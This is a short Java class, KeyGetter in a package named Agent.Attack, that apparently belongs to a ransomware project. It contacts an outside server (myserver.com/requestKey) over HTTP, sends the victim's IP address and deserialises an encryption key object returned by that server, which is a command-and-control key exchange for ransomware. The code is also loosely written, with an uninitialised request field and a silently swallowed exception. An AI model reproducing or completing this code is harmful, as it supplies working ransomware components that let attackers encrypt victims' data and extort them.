package Agent.Attack;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import javax.servlet.http.HttpServletRequest;

import Agent.entites.CryptoKey;
import Agent.exceptions.RansomwareException;

public class KeyGetter {

	HttpServletRequest request;

	public CryptoKey getKey() throws RansomwareException {

		try {
			URL urlForGetRequest = new URL("http://www.myserver.com/requestKey");
			HttpURLConnection con = (HttpURLConnection) urlForGetRequest.openConnection();
			con.setRequestMethod("GET");
			con.setRequestProperty("requestKey", request.getRemoteAddr());
			int responseCode = con.getResponseCode();
			if (responseCode == HttpURLConnection.HTTP_OK) {
				ObjectInputStream is = new ObjectInputStream(con.getInputStream());
			;
				try {
					CryptoKey key = (CryptoKey) is.readObject();
					return key;
				} catch (ClassNotFoundException | IOException e) {
					throw new RansomwareException("key not found");
				}
			}
		} catch (IOException e) {
		}
		throw new RansomwareException("failed");
	}

}
